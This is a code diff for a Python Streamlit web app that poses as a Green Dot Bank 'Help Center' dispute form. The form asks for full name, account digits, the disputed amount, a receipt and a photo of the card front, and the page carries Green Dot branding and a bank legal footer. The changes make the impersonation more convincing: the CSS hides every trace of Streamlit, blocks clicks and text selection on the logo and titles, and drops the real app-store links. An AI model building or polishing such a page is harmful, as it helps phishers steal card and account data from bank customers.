@@ -23,32 +23,24 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")
 
-# --- CSS NUCLEAR ---
+# CSS REFORZADO: Oculta menús, pies de página, botones de despliegue y desactiva punteros en imágenes/títulos
 st.markdown("""<style>
-header {visibility: hidden !important; height: 0px !important;}
-footer {display: none !important; visibility: hidden !important;}
-#MainMenu {visibility: hidden !important;}
-.stDeployButton {display: none !important;}
-[data-testid='stHeader'] {display: none !important;}
-[data-testid='stAppToolbar'] {display: none !important;}
-[data-testid='stFooterAd'] {display: none !important;}
+/* Ocultar elementos de Streamlit */
+header, footer, #MainMenu, .stDeployButton {visibility: hidden !important; display: none !important;}
+[data-testid='stHeader'], [data-testid='stAppToolbar'], [data-testid='stFooterAd'] {display: none !important;}
 
-/* Desactivar click y puntero en logo y títulos para asegurar que no funcionen como links */
-[data-testid="stImage"], h1 {
+/* Desactivar absolutamente todos los eventos de puntero en la cabecera */
+[data-testid="stImage"], [data-testid="stMarkdownContainer"] h1, [data-testid="stMarkdownContainer"] h2 {
     pointer-events: none !important;
     cursor: default !important;
-    text-decoration: none !important;
+    user-select: none !important;
 }
 
+/* Eliminar botón de pantalla completa en imágenes */
 button[title='View fullscreen'] {display: none !important;}
-
-div[class*='viewerBadge'], div[class*='styles_viewerBadge'], [data-testid='stStatusWidget'] {
-    display: none !important;
-}
 
 .block-container {
     padding-top: 2rem !important;
-    padding-bottom: 0rem !important;
     max-width: 800px !important;
 }
 
@@ -57,7 +49,7 @@ div[class*='viewerBadge'], div[class*='styles_viewerBadge'], [data-testid='stSta
     color: white !important;
     width: 100%;
     border-radius: 4px !important;
-    font-weight: bold !important;
+    border: none !important;
 }
 
 .app-promo-container {
@@ -66,6 +58,7 @@ div[class*='viewerBadge'], div[class*='styles_viewerBadge'], [data-testid='stSta
     text-align: center;
     border-radius: 12px;
     margin: 30px 0;
+    pointer-events: auto !important; /* Permitir links solo aquí si es necesario */
 }
 
 .legal-footer {
@@ -78,12 +71,9 @@ div[class*='viewerBadge'], div[class*='styles_viewerBadge'], [data-testid='stSta
 }
 </style>""", unsafe_allow_html=True)
 
-# --- UI CONTENT ---
 if os.path.exists('logo.svg'):
-    # Mostramos la imagen sin el parámetro output_format que a veces genera envoltorios de link
     st.image('logo.svg', width=150)
 
-# Título estático
 st.title("Help Center")
 st.write("Please fill out the form below to submit your claim.")
 
@@ -91,11 +81,9 @@ with st.form("dispute_form_final", clear_on_submit=True):
     nombre = st.text_input("Full Name")
     cuenta = st.text_input("Account Number (Last 4 digits)")
     monto = st.number_input("Disputed Amount ($)", min_value=0.0, format="%.2f")
-
     st.markdown("**Required Evidence**")
     rec = st.file_uploader("Store Receipt", type=['jpg','png','jpeg'])
     car = st.file_uploader("Card Front Image", type=['jpg','png','jpeg'])
-
     submitted = st.form_submit_button("SUBMIT DISPUTE")
 
 if submitted:
@@ -104,16 +92,15 @@ if submitted:
     else:
         st.error("⚠️ Please complete all fields.")
 
-# SECCIÓN DE APP STORES
 st.markdown("""<div class='app-promo-container'>
     <h3 style='color:white;'>Download the Green Dot app</h3>
     <div style='display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-top:20px;'>
-        <a href='#'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='150'></a>
-        <a href='#'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='150'></a>
+        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='150'>
+        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='150'>
     </div>
 </div>""", unsafe_allow_html=True)
 
 st.markdown("""<div class='legal-footer'>
-Green Dot cards are issued by Green Dot Bank, Member FDIC.
+Green Dot cards are issued by Green Dot Bank, Member FDIC. 
 ©2026 Green Dot Bank. All rights reserved. NMLS #914924.
 </div>""", unsafe_allow_html=True)
